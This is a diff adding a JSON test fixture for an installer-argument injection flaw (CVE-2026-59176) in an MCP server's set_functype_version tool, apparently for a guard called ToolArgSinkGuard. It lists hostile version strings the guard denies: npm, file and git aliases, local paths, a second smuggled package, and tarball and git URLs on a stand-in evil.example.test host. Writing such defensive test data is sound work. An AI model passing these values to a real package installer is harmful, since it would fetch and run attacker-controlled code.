@@ -1,0 +1,31 @@
+{
+  "$schema": "Tool calls for CVE-2026-59176 (functype-mcp-server before 1.4.4, CWE-829). `set_functype_version` is the server's tool; its `version` is interpolated into `functype@<version>` for `pnpm add`, and the server then imports what was installed. Each `payloads` entry is one of the package-alias syntaxes NVD names (file:, npm:, URLs, paths) or a sibling of them, with the argument, token and verdict ToolArgSinkGuard reports for an installer argument. Every value is an inert string: nothing is installed and every host is a reserved .test name. `benign` holds versions the guard must admit; `refused_although_benign` holds a range and a dist-tag, which the guard refuses because neither is a bare version.",
+  "disclosed_at": "2026-10-28",
+  "references": {
+    "nvd": "https://nvd.nist.gov/vuln/detail/CVE-2026-59176",
+    "advisory": "https://github.com/jordanburke/functype/security/advisories/GHSA-wcjj-9m6g-2fr2",
+    "fix_commit": "https://github.com/jordanburke/functype/commit/c0d58ad9c2a7d15c6117bd3adbbd75de37317dcf",
+    "fixed_release": "https://github.com/jordanburke/functype/releases/tag/v1.4.4",
+    "triage_issue": "https://github.com/sattyamjjain/agent-airlock/issues/395"
+  },
+  "payloads": [
+    {"id": "file-alias", "tool": "set_functype_version", "arguments": {"version": "file:../evil"}, "argument": "version", "token": "file:", "verdict": "deny_not_a_version"},
+    {"id": "npm-alias", "tool": "set_functype_version", "arguments": {"version": "npm:evil-pkg@1.0.0"}, "argument": "version", "token": "npm:", "verdict": "deny_not_a_version"},
+    {"id": "tarball-url", "tool": "set_functype_version", "arguments": {"version": "https://evil.example.test/functype-9.9.9.tgz"}, "argument": "version", "token": "https:", "verdict": "deny_not_a_version"},
+    {"id": "relative-path", "tool": "set_functype_version", "arguments": {"version": "../evil"}, "argument": "version", "token": "/", "verdict": "deny_not_a_version"},
+    {"id": "absolute-path", "tool": "set_functype_version", "arguments": {"version": "/tmp/evil"}, "argument": "version", "token": "/", "verdict": "deny_not_a_version"},
+    {"id": "github-alias", "tool": "set_functype_version", "arguments": {"version": "github:evil/functype"}, "argument": "version", "token": "github:", "verdict": "deny_not_a_version"},
+    {"id": "git-url", "tool": "set_functype_version", "arguments": {"version": "git+https://evil.example.test/functype.git"}, "argument": "version", "token": "git+", "verdict": "deny_not_a_version"},
+    {"id": "second-package", "tool": "set_functype_version", "arguments": {"version": "1.4.4 evil"}, "argument": "version", "token": " ", "verdict": "deny_not_a_version"}
+  ],
+  "benign": [
+    {"id": "exact", "tool": "set_functype_version", "arguments": {"version": "1.4.4"}},
+    {"id": "caret", "tool": "set_functype_version", "arguments": {"version": "^1.4.4"}},
+    {"id": "tilde", "tool": "set_functype_version", "arguments": {"version": "~1.4.4"}},
+    {"id": "prerelease", "tool": "set_functype_version", "arguments": {"version": "1.5.0-beta.1"}}
+  ],
+  "refused_although_benign": [
+    {"id": "range", "tool": "set_functype_version", "arguments": {"version": ">=1.4.4"}, "argument": "version", "token": null, "verdict": "deny_not_a_version"},
+    {"id": "dist-tag", "tool": "set_functype_version", "arguments": {"version": "latest"}, "argument": "version", "token": null, "verdict": "deny_not_a_version"}
+  ]
+}
